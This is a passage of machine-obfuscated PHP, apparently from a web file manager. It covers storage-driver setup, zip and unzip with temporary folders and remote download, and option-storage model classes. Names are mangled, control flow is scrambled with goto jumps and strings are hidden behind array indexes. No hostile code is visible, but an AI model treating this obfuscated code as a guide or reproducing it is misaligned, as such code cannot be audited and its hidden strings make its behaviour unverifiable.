= $F§½¥¦ˆí‡[$DÙ±–£ÚÒ[84]]; $Eƒ•ïÊË² = array($DÙ±–£ÚÒ[759] => $DÙ±–£ÚÒ[769]); break; } $Fõâº‹æö = $F§½¥¦ˆí‡[$DÙ±–£ÚÒ[84]]; if (!isset(self::$driverCache[$Fõâº‹æö])) { $e•Ãëñ©§Š = $DÙ±–£ÚÒ[80] . self::driverType($Eƒ•ïÊË²[$DÙ±–£ÚÒ[97]]); if (!class_exists($e•Ãëñ©§Š)) { show_json("{$e•Ãëñ©§Š}\x20\x6e\157\164\x20\145\170\151\x73\x74\163\41", !1); } $BËÇƒë­µ¡ = isset($Eƒ•ïÊË²[$DÙ±–£ÚÒ[6]]) ? $Eƒ•ïÊË²[$DÙ±–£ÚÒ[6]] : !1; self::$driverCache[$Fõâº‹æö] = new $e•Ãëñ©§Š($BËÇƒë­µ¡); } goto AÄì†İÁÆÇ; FĞ¯¦ÂŸÅº: if (isset($Eƒ•ïÊË²[$DÙ±–£ÚÒ[6]][$DÙ±–£ÚÒ[770]])) { $B‘±èéèª->pathBase = rtrim($Eƒ•ïÊË²[$DÙ±–£ÚÒ[6]][$DÙ±–£ÚÒ[770]], $DÙ±–£ÚÒ[8]) . $DÙ±–£ÚÒ[8]; $bš®éõ‘«ƒ = $B‘±èéèª->pathBase . ltrim($bš®éõ‘«ƒ, $DÙ±–£ÚÒ[8]); } $bš®éõ‘«ƒ = $B‘±èéèª->getPath($bš®éõ‘«ƒ); if (isset($F§½¥¦ˆí‡[$DÙ±–£ÚÒ[743]])) { $bš®éõ‘«ƒ = $F§½¥¦ˆí‡[$DÙ±–£ÚÒ[743]]; } goto bÃÇŸÅ‰¸Ä; bÃÇŸÅ‰¸Ä: $B‘±èéèª->path = $bš®éõ‘«ƒ; return $B‘±èéèª; goto A¤ÉåÕÁŒ‡; AÄì†İÁÆÇ: $B‘±èéèª = self::$driverCache[$Fõâº‹æö]; $B‘±èéèª->pathDriver = $dÖÔ¸±Ó†; $B‘±èéèª->pathBase = $DÙ±–£ÚÒ[33]; goto FĞ¯¦ÂŸÅº; A¤ÉåÕÁŒ‡: } private static function driverType($AêÑµ­) { $Eš†÷ƒÄÒà =& $_SERVER[°Óó£ÌİóèÅ]; $AêÑµ­ = strtolower($AêÑµ­); if ($AêÑµ­ == $Eš†÷ƒÄÒà[73]) { $AêÑµ­ = $Eš†÷ƒÄÒà[771]; } else { if (in_array($AêÑµ­, array($Eš†÷ƒÄÒà[110], $Eš†÷ƒÄÒà[66], $Eš†÷ƒÄÒà[772]))) { $AêÑµ­ = ucfirst($AêÑµ­); } else { $AêÑµ­ = strtoupper($AêÑµ­); } } return $AêÑµ­; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $A£›ŞŠœö; if (!$A£›ŞŠœö) { $C’Ê¯è³¯ = IO::init($_SERVER[°Óó£ÌİóèÅ][8]); } return $C’Ê¯è³¯; } private static function iconvSystem($F‹´Õø××à) { return self::local()->iconvSystem($F‹´Õø××à); } private static function iconvApp($bùÁœ¦å) { return self::local()->iconvApp($bùÁœ¦å); } public static function zip($B§êïöò”, $Eà–ù‘Æ¤È = "\x7a\x69\x70", $f†’É„²íê = '', $e²‹³†˜Öç = REPEAT_RENAME) { goto aÂ¯¨Ø¡¢¢; fÈ„„Ç˜³: $b–šˆÏë° = $DôÁÕ©Šœâ . $bğ½Å¼ŠÍ . $AÍÃ¿ê‘éÏ[100] . $Eà–ù‘Æ¤È; $b–šˆÏë° = get_filename_auto($b–šˆÏë°, $AÍÃ¿ê‘éÏ[33], $e²‹³†˜Öç); $c‰İÌø¤ß¼ = self::iconvSystem($b–šˆÏë°); goto dôÕãÎä¤; e‡² ¸íÛ¸: return $Bê¢õ™‚´õ; goto C½ŠğãĞğ; dôÕãÎä¤: foreach ($eäØÑ„ƒˆ as $fˆ¨‚Ô˜·› => $C°í­Æ ÈÅ) { $eäØÑ„ƒˆ[$fˆ¨‚Ô˜·›] = self::iconvSystem($C°í­Æ ÈÅ); } KodArchive::create($c‰İÌø¤ß¼, $eäØÑ„ƒˆ); if (!IO::exist($b–šˆÏë°)) { if ($a¡¬œ•‘÷) { del_dir($a¡¬œ•‘÷); } show_json(LNG($AÍÃ¿ê‘éÏ[776]), !1); } goto Eß÷£œÍâŞ; aÂ¯¨Ø¡¢¢: $AÍÃ¿ê‘éÏ =& $_SERVER[°Óó£ÌİóèÅ]; $E·°Šêø‹ = self::init($B§êïöò”[0][$AÍÃ¿ê‘éÏ[84]]); $FË‡ÌÆùÖ = self::info($B§êïöò”[0][$AÍÃ¿ê‘éÏ[84]]); goto AŒ¾øè›; F ¾¤øÊÊ©: if (count($eäØÑ„ƒˆ) > 1) { $C››æƒ–ø¤ = isset($FË‡ÌÆùÖ[$AÍÃ¿ê‘éÏ[774]]) ? $FË‡ÌÆùÖ[$AÍÃ¿ê‘éÏ[774]] : $FË‡ÌÆùÖ[$AÍÃ¿ê‘éÏ[84]]; $bğ½Å¼ŠÍ = get_path_this(get_path_father($C››æƒ–ø¤)); } $DôÁÕ©Šœâ = $a¡¬œ•‘÷; if (!$DôÁÕ©Šœâ) { $DôÁÕ©Šœâ = get_path_father($FË‡ÌÆùÖ[$AÍÃ¿ê‘éÏ[84]]); $bİÎåÜ’“¨ = IO::info($DôÁÕ©Šœâ); if (!$bİÎåÜ’“¨[$AÍÃ¿ê‘éÏ[197]]) { show_json(LNG($AÍÃ¿ê‘éÏ[775]), !1); } } goto fÈ„„Ç˜³; eâ½¡ÀØòâ: $Bê¢õ™‚´õ = self::move($b–šˆÏë°, $D’Ûª“öÓ, $e²‹³†˜Öç); if (!$Bê¢õ™‚´õ) { del_dir($a¡¬œ•‘÷); show_json(LNG($AÍÃ¿ê‘éÏ[776]), !1); } del_dir($a¡¬œ•‘÷); goto e‡² ¸íÛ¸; Eß÷£œÍâŞ: if ($f†’É„²íê || !$a¡¬œ•‘÷) { if ($a¡¬œ•‘÷ && strstr($a¡¬œ•‘÷, TEMP_FILES)) { $d§‚¿Ó„Ê¥ = $eäØÑ„ƒˆ = array(); recursion_dir($DôÁÕ©Šœâ, $d§‚¿Ó„Ê¥, $eäØÑ„ƒˆ, 0); foreach ($d§‚¿Ó„Ê¥ as $Aéø„ÈãÚ) { del_dir($Aéø„ÈãÚ); } foreach ($eäØÑ„ƒˆ as $C Šï¥«È¼) { if ($C Šï¥«È¼ == $c‰İÌø¤ß¼) { continue; } del_file($C Šï¥«È¼); } } return $b–šˆÏë°; } $D’Ûª“öÓ = self::pathFather($FË‡ÌÆùÖ[$AÍÃ¿ê‘éÏ[84]]); $D’Ûª“öÓ = $E·°Šêø‹->getPathOuter($E·°Šêø‹->iconvSystem($D’Ûª“öÓ)); goto eâ½¡ÀØòâ; AŒ¾øè›: $a¡¬œ•‘÷ = !1; if (!$f†’É„²íê && $E·°Šêø‹->getType() == $AÍÃ¿ê‘éÏ[110]) { $eäØÑ„ƒˆ = self::zipFileList($B§êïöò”); } else { $a¡¬œ•‘÷ = $f†’É„²íê ? $f†’É„²íê : TEMP_FILES . $AÍÃ¿ê‘éÏ[773] . time() . rand_string(5) . $AÍÃ¿ê‘éÏ[8]; mk_dir($a¡¬œ•‘÷); $eäØÑ„ƒˆ = self::zipFileList($B§êïöò”, $a¡¬œ•‘÷); } $bğ½Å¼ŠÍ = $FË‡ÌÆùÖ[$AÍÃ¿ê‘éÏ[28]]; goto F ¾¤øÊÊ©; C½ŠğãĞğ: } public static function unzip($FçØ•§ªÜ˜, $Eõä‘ŒÆ = "\x72\145\160\x6c\141\143\x65") { goto e¢ £Ú‚¬¦; c‚’ï¨ï«: mk_dir($a“À·»’µ÷); $Aå…†Ş±§Œ = $a“À·»’µ÷ . $CîêÚçÙŒÁ[100] . $eö´‡‡¯¢›[$CîêÚçÙŒÁ[165]]; if (!@file_exists(self::iconvSystem($Aå…†Ş±§Œ))) { $b §µÃÒ²æ = self::localFilePath($B­…—Ô„Ì, $eö´‡‡¯¢›[$CîêÚçÙŒÁ[165]]); $Aå…†Ş±§Œ = $b §µÃÒ²æ ? $b §µÃÒ²æ : parent::download($B­…—Ô„Ì, $Aå…†Ş±§Œ); } goto Dì¦«‡¾íª; b¸ö†óŒ­»: del_dir($a“À·»’µ÷); if (!$b §µÃÒ²æ) { del_file($Aå…†Ş±§Œ); } return !0; goto EÜ’Ö‰ôÍì; Dì¦«‡¾íª: $Aå…†Ş±§Œ = self::iconvSystem($Aå…†Ş±§Œ); $bô–¢ï‚¿ = isset($FçØ•§ªÜ˜[$CîêÚçÙŒÁ[779]]) ? $FçØ•§ªÜ˜[$CîêÚçÙŒÁ[779]] : $CîêÚçÙŒÁ[780]; $d‹ö†¹èÊ¦ = KodArchive::extract($Aå…†Ş±§Œ, $a“À·»’µ÷ . $CîêÚçÙŒÁ[8], $bô–¢ï‚¿); goto c¿ƒš³ö³; e¢ £Ú‚¬¦: $CîêÚçÙŒÁ =& $_SERVER[°Óó£ÌİóèÅ]; $B­…—Ô„Ì = $FçØ•§ªÜ˜[$CîêÚçÙŒÁ[84]]; $B…É……¿Ë = $FçØ•§ªÜ˜[$CîêÚçÙŒÁ[777]]; goto f¿Û¡íã°á; fù›Œá : recursion_dir($a“À·»’µ÷, $D¨ë½¿…Ö†, $a»îöóò, 0); $E×àß§¨ƒ´ = array_merge($D¨ë½¿…Ö†, $a»îöóò); foreach ($E×àß§¨ƒ´ as $Fêñ±™óì) { $Fêñ±™óì = self::iconvApp($Fêñ±™óì); self::move($Fêñ±™óì, $B…É……¿Ë, $Eõä‘ŒÆ); } goto b¸ö†óŒ­»; c¿ƒš³ö³: self::archiveExt(); if (!$d‹ö†¹èÊ¦[$CîêÚçÙŒÁ[781]]) { show_json($CîêÚçÙŒÁ[782] . $d‹ö†¹èÊ¦[$CîêÚçÙŒÁ[783]], !1); } Hook::trigger($CîêÚçÙŒÁ[784], $a“À·»’µ÷); goto fù›Œá ; f¿Û¡íã°á: if (!($eö´‡‡¯¢› = parent::info($B­…—Ô„Ì))) { show_json(LNG($CîêÚçÙŒÁ[778]), !1); } if (!($a„§“·Üåß = parent::infoFull($B…É……¿Ë))) { $B…É……¿Ë = parent::mkdir($B…É……¿Ë); $a„§“·Üåß = array($CîêÚçÙŒÁ[84] => $B…É……¿Ë); } else { if (isset($a„§“·Üåß[$CîêÚçÙŒÁ[382]]) && trim($a„§“·Üåß[$CîêÚçÙŒÁ[84]], $CîêÚçÙŒÁ[8]) != trim($B…É……¿Ë, $CîêÚçÙŒÁ[8])) { $A ßÉ“µØï = KodIO::make($a„§“·Üåß[$CîêÚçÙŒÁ[392]]); $CİÉ—³ÇÜ£ = parent::fileNameAuto($A ßÉ“µØï, $a„§“·Üåß[$CîêÚçÙŒÁ[28]], REPEAT_RENAME_FOLDER, !0); $B…É……¿Ë = parent::mkdir($A ßÉ“µØï . $CİÉ—³ÇÜ£); $a„§“·Üåß = array($CîêÚçÙŒÁ[84] => $B…É……¿Ë); } } $B…É……¿Ë = $a„§“·Üåß[$CîêÚçÙŒÁ[84]]; goto eéîŒÃˆ„–; eéîŒÃˆ„–: $B˜…•¦Œàö = self::tmpFileName($eö´‡‡¯¢›); $a“À·»’µ÷ = TEMP_FILES . $B˜…•¦Œàö; del_dir($a“À·»’µ÷); goto c‚’ï¨ï«; EÜ’Ö‰ôÍì: } public function unzipList($a†çŠºµÓ) { goto b‘®øËÈ›Ô; d¶Æ´âÅâ: self::setContent($dšÊƒ¯ºæ¸, $D¬ÆâæÕ›¼); if (count($E¶±‘ÇÑ¹ª[$c«Õ†œÄ²§[783]]) >= $EîÜ©©Çğ) { show_json(sprintf(LNG($c«Õ†œÄ²§[787]), count($E¶±‘ÇÑ¹ª[$c«Õ†œÄ²§[783]])), !1); } return $E¶±‘ÇÑ¹ª[$c«Õ†œÄ²§[783]]; goto eÄÀ•¨é«™; c¥çÌšãšå: $e›»ŸâƒéØ = $E¾µªÎ£¹º . $c«Õ†œÄ²§[8] . $CµÏòôÅßĞ; if (!@file_exists(self::iconvSystem($e›»ŸâƒéØ))) { if (isset($Eò‚öé’ÄÎ)) { url_request($b±ÂÓ§Ó­ä, $c«Õ†œÄ²§[788], $e›»ŸâƒéØ); } else { $BÂ²¹¹¨¶ = self::localFilePath($b±ÂÓ§Ó­ä, $dÙùç¤®‹[$c«Õ†œÄ²§[165]]); $e›»ŸâƒéØ = $BÂ²¹¹¨¶ ? $BÂ²¹¹¨¶ : self::download($b±ÂÓ§Ó­ä, $e›»ŸâƒéØ); } } $e›»ŸâƒéØ = self::iconvSystem($e›»ŸâƒéØ); goto d„è˜ø÷ˆƒ; d„è˜ø÷ˆƒ: if ($eÑÔ˜Òª¢Í >= 0) { $bÊ¥­Œ·­ = isset($a†çŠºµÓ[$c«Õ†œÄ²§[789]]) ? $a†çŠºµÓ[$c«Õ†œÄ²§[789]] : !1; $C…¾’ˆèŞ© = isset($a†çŠºµÓ[$c«Õ†œÄ²§[28]]) ? $a†çŠºµÓ[$c«Õ†œÄ²§[28]] : $c«Õ†œÄ²§[33]; KodArchive::filePreview($e›»ŸâƒéØ, $eÑÔ˜Òª¢Í, $bÊ¥­Œ·­, $C…¾’ˆèŞ©); self::archiveExt(); die; } $E¶±‘ÇÑ¹ª = KodArchive::listContent($e›»ŸâƒéØ); self::archiveExt(); goto E„á‚ã¹›ï; E„á‚ã¹›ï: del_dir($E¾µªÎ£¹º); if (!$E¶±‘ÇÑ¹ª[$c«Õ†œÄ²§[781]]) { show_json($E¶±‘ÇÑ¹ª[$c«Õ†œÄ²§[783]], !1); } $D¬ÆâæÕ›¼ = json_encode($E¶±‘ÇÑ¹ª[$c«Õ†œÄ²§[783]]); goto d¶Æ´âÅâ; Eˆ œá»: $EîÜ©©Çğ = 50000; if (request_url_safe($b±ÂÓ§Ó­ä)) { $Eò‚öé’ÄÎ = parse_url_query($b±ÂÓ§Ó­ä); if (!isset($Eò‚öé’ÄÎ[$c«Õ†œÄ²§[84]])) { show_json($c«Õ†œÄ²§[786], !1); } } $DáåÄÒ…ãŞ = isset($Eò‚öé’ÄÎ) ? $Eò‚öé’ÄÎ[$c«Õ†œÄ²§[84]] : $b±ÂÓ§Ó­ä; goto eµ—±ß•­Ú; fê†‹Ù›†©: if ($eÑÔ˜Òª¢Í == -1) { $dšÊƒ¯ºæ¸ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\x70\126\151\145\x77\57{$dƒ÷·Õ‹ù}\57{$CµÏòôÅßĞ}\56\x6c\157\x67"; $e†Åï„Ğ… = self::infoFull($dšÊƒ¯ºæ¸); if ($e†Åï„Ğ…) { $dšÊƒ¯ºæ¸ = $e†Åï„Ğ…[$c«Õ†œÄ²§[84]]; $B§—ÖÍ›ä = self::getContent($dšÊƒ¯ºæ¸); if ($B§—ÖÍ›ä) { $D¬ÆâæÕ›¼ = json_decode($B§—ÖÍ›ä, !0); if (count($D¬ÆâæÕ›¼) >= $EîÜ©©Çğ) { show_json(sprintf(LNG($c«Õ†œÄ²§[787]), count($D¬ÆâæÕ›¼)), !1); } return $D¬ÆâæÕ›¼; } } else { $dšÊƒ¯ºæ¸ = self::mkfile($dšÊƒ¯ºæ¸); } } $E¾µªÎ£¹º = TEMP_FILES . $dƒ÷·Õ‹ù; if (!is_dir($E¾µªÎ£¹º)) { mk_dir($E¾µªÎ£¹º); } goto c¥çÌšãšå; eµ—±ß•­Ú: $dÙùç¤®‹ = self::info($DáåÄÒ…ãŞ); $dƒ÷·Õ‹ù = self::tmpFileName($dÙùç¤®‹); if (isset($Eò‚öé’ÄÎ)) { $f˜Œí×øïµ = array($Eò‚öé’ÄÎ[$c«Õ†œÄ²§[84]], $Eò‚öé’ÄÎ[$c«Õ†œÄ²§[785]], $Eò‚öé’ÄÎ[$c«Õ†œÄ²§[28]]); $CµÏòôÅßĞ = md5(implode($c«Õ†œÄ²§[79], $f˜Œí×øïµ)) . $c«Õ†œÄ²§[100] . get_path_ext($Eò‚öé’ÄÎ[$c«Õ†œÄ²§[28]]); } else { $f˜Œí×øïµ = array($dÙùç¤®‹[$c«Õ†œÄ²§[28]], $dÙùç¤®‹[$c«Õ†œÄ²§[84]], $dÙùç¤®‹[$c«Õ†œÄ²§[86]]); $CµÏòôÅßĞ = md5(implode($c«Õ†œÄ²§[79], $f˜Œí×øïµ)) . $c«Õ†œÄ²§[100] . $dÙùç¤®‹[$c«Õ†œÄ²§[165]]; } goto fê†‹Ù›†©; b‘®øËÈ›Ô: $c«Õ†œÄ²§ =& $_SERVER[°Óó£ÌİóèÅ]; $b±ÂÓ§Ó­ä = $a†çŠºµÓ[$c«Õ†œÄ²§[84]]; $eÑÔ˜Òª¢Í = isset($a†çŠºµÓ[$c«Õ†œÄ²§[785]]) ? $a†çŠºµÓ[$c«Õ†œÄ²§[785]] : -1; goto Eˆ œá»; eÄÀ•¨é«™: } private function zipFileList($FôÎºÃ¨éë, $cÊ‹Å…èªß = false) { $c‹“ƒ˜¸ÆŸ =& $_SERVER[°Óó£ÌİóèÅ]; $DİÜ…ÑÅ† = array(); foreach ($FôÎºÃ¨éë as $BÕÙèÍ) { $bø¼ŒÉàáÉ = $BÕÙèÍ[$c‹“ƒ˜¸ÆŸ[84]]; if ($cÊ‹Å…èªß) { $bø¼ŒÉàáÉ = self::copy($BÕÙèÍ[$c‹“ƒ˜¸ÆŸ[84]], $cÊ‹Å…èªß, $c‹“ƒ˜¸ÆŸ[520]); } if ($bø¼ŒÉàáÉ && self::local()->exist($bø¼ŒÉàáÉ)) { $DİÜ…ÑÅ†[$BÕÙèÍ[$c‹“ƒ˜¸ÆŸ[84]]] = $bø¼ŒÉàáÉ; } } if (!empty($DİÜ…ÑÅ†)) { return array_values($DİÜ…ÑÅ†); } show_json(LNG($c‹“ƒ˜¸ÆŸ[790]), !1); } public static function tmpFileName($aŒ‡àÁ§×) { $a“æ–öñ · =& $_SERVER[°Óó£ÌİóèÅ]; $bÕÆãÑ•÷ã = array($aŒ‡àÁ§×[$a“æ–öñ ·[28]], $aŒ‡àÁ§×[$a“æ–öñ ·[84]], $aŒ‡àÁ§×[$a“æ–öñ ·[86]], $aŒ‡àÁ§×[$a“æ–öñ ·[381]]); return md5(implode($a“æ–öñ ·[79], $bÕÆãÑ•÷ã)); } private function localFilePath($aâ‡¸Œó…¸, $Eˆ§à¥‡Ö†) { goto EİĞ²¹®‘; b½Á¿–åœ: if ($a©ïºÒ†ˆå != $bê‰»É…¢[110] || $Eˆ§à¥‡Ö† == $bê‰»É…¢[793] && $dâ¯Ÿñ¶’Ã) { return !1; } if (!$a¤±îÖéã->exist($a¤±îÖéã->path)) { show_json(LNG($bê‰»É…¢[109]), !1); } self::archiveExt($Eˆ§à¥‡Ö†); goto C·Œ††ªŒ·; fˆùÌæ¤Õ¹: $a¤±îÖéã = self::init($aâ‡¸Œó…¸); $a©ïºÒ†ˆå = $a¤±îÖéã->getType(); $dâ¯Ÿñ¶’Ã = strtoupper(substr(PHP_OS, 0, 3)) == $bê‰»É…¢[792]; goto b½Á¿–åœ; EİĞ²¹®‘: $bê‰»É…¢ =& $_SERVER[°Óó£ÌİóèÅ]; $cÁ†¯éÓ› = KodIO::parse($aâ‡¸Œó…¸); if ($cÁ†¯éÓ›[$bê‰»É…¢[29]] == KodIO::KOD_SOURCE) { $B…è¤ÇõÚ´ = Model($bê‰»É…¢[529])->fileInfoGet(KodIO::sourceID($aâ‡¸Œó…¸)); if (!$B…è¤ÇõÚ´[$bê‰»É…¢[84]]) { show_json($bê‰»É…¢[791], !1); } $aâ‡¸Œó…¸ = $B…è¤ÇõÚ´[$bê‰»É…¢[84]]; } goto fˆùÌæ¤Õ¹; C·Œ††ªŒ·: return $a¤±îÖéã->path; goto dñ¦Ø§Ÿ´Û; dñ¦Ø§Ÿ´Û: } private function archiveExt($A·×è½©Ç = '') { $GLOBALS[$_SERVER[°Óó£ÌİóèÅ][794]] = $A·×è½©Ç; } } goto f¬È¸½“Æ•; bôÅ—ìĞÒ¼: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\x74\145\155\x4f\160\164\151\x6f\x6e"; public $field = array(); public function listData($b÷¦ä÷Íóé = false, $EÊ«¬¥‰‡› = "\155\x6f\144\151\146\171\x54\x69\x6d\145", $aöŞÛÜ¯Ô = false) { $b¬ô‚•ä“ò = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$b÷¦ä÷Íóé) { $b¬ô‚•ä“ò = array_filter(array_values($b¬ô‚•ä“ò)); return array_sort_by($b¬ô‚•ä“ò, $EÊ«¬¥‰‡›, $aöŞÛÜ¯Ô); } return $b¬ô‚•ä“ò[$_SERVER[°Óó£ÌİóèÅ][373] . $b÷¦ä÷Íóé]; } public function insert($Cø•ŸÛ™ªí) { goto f§Íõ¤À¯ğ; f§Íõ¤À¯ğ: $EÌÚÑƒ¿øÄ =& $_SERVER[°Óó£ÌİóèÅ]; $Cø•ŸÛ™ªí = array_field_key($Cø•ŸÛ™ªí, $this->field); $bÁµ­â½»½ = Model($this->modelType)->get($EÌÚÑƒ¿øÄ[374], $this->optionType . $EÌÚÑƒ¿øÄ[375]); goto AŠˆˆˆ–æ; AŠˆˆˆ–æ: $bÁµ­â½»½ = $bÁµ­â½»½ ? $bÁµ­â½»½ : 0; $Cø•ŸÛ™ªí[$EÌÚÑƒ¿øÄ[376]] = ++$bÁµ­â½»½; $Cø•ŸÛ™ªí[$EÌÚÑƒ¿øÄ[195]] = time(); goto FŒÚ¸–ÄŒ; FŒÚ¸–ÄŒ: $Cø•ŸÛ™ªí[$EÌÚÑƒ¿øÄ[114]] = time(); Model($this->modelType)->set($EÌÚÑƒ¿øÄ[374], $bÁµ­â½»½, $this->optionType . $EÌÚÑƒ¿øÄ[375]); Model($this->modelType)->set($EÌÚÑƒ¿øÄ[373] . $bÁµ­â½»½, $Cø•ŸÛ™ªí, $this->optionType); goto d“ÆÅ¬ˆõ‘; d“ÆÅ¬ˆõ‘: return $bÁµ­â½»½; goto D Ô…Ûåİ; D Ô…Ûåİ: } public function update($f—¤Šîù¤Ò, $FÇÀ”™ßØ…) { goto D·¹â¶Ÿğì; Cƒ¹ª­©÷Õ: return Model($this->modelType)->set($d¥ö§©Û‘İ[373] . $f—¤Šîù¤Ò, $FÇÀ”™ßØ…, $this->optionType); goto d‰ÇË¸‚Ç·; D·¹â¶Ÿğì: $d¥ö§©Û‘İ =& $_SERVER[°Óó£ÌİóèÅ]; $FÇÀ”™ßØ… = array_field_key($FÇÀ”™ßØ…, $this->field); $b˜±×Õ…œ„ = $this->listData($f—¤Šîù¤Ò); goto Fáùæ»Õ•ô; Fáùæ»Õ•ô: if (!$b˜±×Õ…œ„) { return !1; } $FÇÀ”™ßØ… = array_merge($b˜±×Õ…œ„, $FÇÀ”™ßØ…); $FÇÀ”™ßØ…[$d¥ö§©Û‘İ[114]] = time(); goto Cƒ¹ª­©÷Õ; d‰ÇË¸‚Ç·: } public function remove($Dâ¶Ñ©¸ÆŠ) { return Model($this->modelType)->remove($_SERVER[°Óó£ÌİóèÅ][373] . $Dâ¶Ñ©¸ÆŠ, $this->optionType); } public function clear() { $b£˜ù×à¢ =& $_SERVER[°Óó£ÌİóèÅ]; Model($this->modelType)->remove($b£˜ù×à¢[374], $this->optionType . $b£˜ù×à¢[375]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($d¹²Ÿ—ÛãÇ, $CÇÑ–„à†) { if (!$CÇÑ–„à†) { return !1; } $aÖ“î­»‘“ = $this->listData(); $aÖ“î­»‘“ = array_to_keyvalue($aÖ“î­»‘“, $d¹²Ÿ—ÛãÇ); return isset($aÖ“î­»‘“[$CÇÑ–„à†]) ? $aÖ“î­»‘“[$CÇÑ–„à†] : !1; } public function findByName($cÕˆ™Ù†Ì) { return $this->findByKey($_SERVER[°Óó£ÌİóèÅ][28], $cÕˆ™Ù†Ì); } protected function resetData($d¹©ªòŒ’Å) { $F­öƒÜËÁÌ =& $_SERVER[°Óó£ÌİóèÅ]; $f¨ßç²š­ƒ = array(); for ($fŠ‘¹ªöÛË = 0; $fŠ‘¹ªöÛË < count($d¹©ªòŒ’Å); $fŠ‘¹ªöÛË++) { $f¨ßç²š­ƒ[$F­öƒÜËÁÌ[373] . $d¹©ªòŒ’Å[$fŠ‘¹ªöÛË][$F­öƒÜËÁÌ[376]]] = $d¹©ªòŒ’Å[$fŠ‘¹ªöÛË]; } return Model($this->modelType)->set($f¨ßç²š­ƒ, !1, $this->optionType); } private function getAutoName($f¸’çØï„á) { $bİ¡­ÓğÚ• = array_to_keyvalue($this->listData(), $_SERVER[°Óó£ÌİóèÅ][28]); if (!$bİ¡­ÓğÚ• || !isset($bİ¡­ÓğÚ•[$f¸’çØï„á])) { return $f¸’çØï„á; } for ($dÁóƒƒó = 1; $dÁóƒƒó < count($bİ¡­ÓğÚ•); $dÁóƒƒó++) { $CªæùŠ¾É  = $f¸’çØï„á . "\x28{$dÁóƒƒó}\51"; if (!isset($bİ¡­ÓğÚ•[$CªæùŠ¾É ])) { return $CªæùŠ¾É ; } } return $CªæùŠ¾É ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($cò¥éê½Ã› = false, $d˜íˆÒç°Ì = '', $cŸìÛ‹‰ï° = false) { goto a†ÊÌâö»; DøâØå™…½: $C—¯´ªĞ” = $this->filterWhere(array($AåÛ´Ùö…†[29] => $d˜íˆÒç°Ì)); $D“Ÿ´Íñ È = $this->where($C—¯´ªĞ”)->select(); $D“Ÿ´Íñ È = array_to_keyvalue($D“Ÿ´Íñ È, $AåÛ´Ùö…†[96], $AåÛ´Ùö…†[367]); goto EÔì¹„£Ê²; a†ÊÌâö»: $AåÛ´Ùö…† =& $_SERVER[°Óó£ÌİóèÅ]; $D“Ÿ´Íñ È = $this->cacheGet($d˜íˆÒç°Ì); if (is_array($D“Ÿ´Íñ È)) { return $cò¥éê½Ã› ? isset($D“Ÿ´Íñ È[$cò¥éê½Ã›]) ? $D“Ÿ´Íñ È[$cò¥éê½Ã›] : null : $D“Ÿ´Íñ È; } goto DøâØå™…½; EÔì¹„£Ê²: foreach ($D“Ÿ´Íñ È as $d‹–áè³¤ù => $Aò¬ëâƒÔ) { if ($cŸìÛ‹‰ï° || in_array($d‹–áè³¤ù, $this->jsonField)) { $D“Ÿ´Íñ È[$d‹–áè³¤ù] = json_decode($D“Ÿ´Íñ È[$d‹–áè³¤ù], !0); } } $this->cacheSet($d˜íˆÒç°Ì, $D“Ÿ´Íñ È); return $cò¥éê½Ã› ? $D“Ÿ´Íñ È[$cò¥éê½Ã›] : $D“Ÿ´Íñ È; goto e¦ç¦Í¿ºÑ; e¦ç¦Í¿ºÑ: } public function set($E÷°ÛÊâÆ¦, $Eî‰Û›‚…Å = false, $CªÌã¦äÑ = '') { $DìšÙç =& $_SERVER[°Óó£ÌİóèÅ]; $this->cacheRemove($CªÌã¦äÑ); $dŞ°Æğ»Äâ = array(); $cÜæö“÷ = is_array($E÷°ÛÊâÆ¦) ? $E÷°ÛÊâÆ¦ : array($E÷°ÛÊâÆ¦ => $Eî‰Û›‚…Å); foreach ($cÜæö“÷ as $E÷°ÛÊâÆ¦ => $b´ªÏïÑ†á) { if (is_array($b´ªÏïÑ†á)) { $b´ªÏïÑ†á = json_encode_force($b´ªÏïÑ†á); } $b´ªÏïÑ†á = self::textEncode($b´ªÏïÑ†á); $cÜæö“÷ = array($DìšÙç[29] => $CªÌã¦äÑ, $DìšÙç[96] => $E÷°ÛÊâÆ¦, $DìšÙç[367] => $b´ªÏïÑ†á); $dŞ°Æğ»Äâ[] = $this->filterWhere($cÜæö“÷); } return $this->addAll($dŞ°Æğ»Äâ, array(), !0); } public function setDeep($aÙôÔ°¬ë, $E·¤‰Ø Ö = false, $DŒ±ÊğÜßË = '') { $a„âå“†‚ = explode($_SERVER[°Óó£ÌİóèÅ][100], $aÙôÔ°¬ë); $D‡Ô÷¼Ö°‘ = $this->get(); array_set_value($D‡Ô÷¼Ö°‘, $aÙôÔ°¬ë, $E·¤‰Ø Ö); $this->set($a„âå“†‚[0], $D‡Ô÷¼Ö°‘[$a„âå“†‚[0]], $DŒ±ÊğÜßË); } public function remove($C³èŞéÇÌ, $B‘Ğ÷¿÷”ã = '') { $EóÑóƒåËÂ =& $_SERVER[°Óó£ÌİóèÅ]; $this->CacheRemove($B‘Ğ÷¿÷”ã); $CÃ»’Ùƒõ³ = $this->filterWhere(array($EóÑóƒåËÂ[96] => $C³èŞéÇÌ, $EóÑóƒåËÂ[29] => $B‘Ğ÷¿÷”ã)); if (is_null($C³èŞéÇÌ)) { unset($CÃ»’Ùƒõ³[$EóÑóƒåËÂ[96]]); } return $this->where($CÃ»’Ùƒõ³)->delete(); } public function cacheSet($FğËÅ¿³¹, $b‹±ºëœ¢Ú = false) { return Cache::set($this->cacheKey($FğËÅ¿³¹), $b‹±ºëœ¢Ú); } public function cacheGet($dòŒ„’ ²½) { return Cache::get($this->cacheKey($dòŒ„’ ²½)); } public function cacheRemove($cÇêÜŸŞ™î) { return Cache::remove($this->cacheKey($cÇêÜŸŞ™î)); } protected function filterWhere($FîØÙÄ§) { return $FîØÙÄ§; } protected function cacheKey($d¥¾Ù®‰ä‰) { return $d¥¾Ù®‰ä‰; } } define($_SERVER[°Óó£ÌİóèÅ][377], $_SERVER[°Óó£ÌİóèÅ][378]); goto aÎ˜Ş‚£ºù; B”‰àÈŒß: define($_SERVER[°Óó£ÌİóèÅ][1366], 5); define($_SERVER[°Óó£ÌİóèÅ][1367], 16); define($_SERVER[°Óó£ÌİóèÅ][1368], 32); goto cĞæÎ¼‹í; 